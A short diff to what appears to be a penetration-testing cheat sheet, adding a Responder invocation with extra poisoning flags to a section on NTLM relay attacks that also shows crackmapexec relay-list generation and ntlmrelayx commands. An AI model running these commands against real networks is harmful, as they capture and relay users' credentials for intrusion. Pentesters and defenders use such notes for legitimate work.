@@ -102,6 +102,9 @@ cme smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
 ```bash
 python Responder.py -I <interface> -rdw
 ntlmrelayx.py -tf relaylistOutputFilename.txt
+
+# If no hash, try all the responder arguments 
+python Responder.py -I <interface> -rdPF
 ```
 
 mitm6 + NTLMrelayx
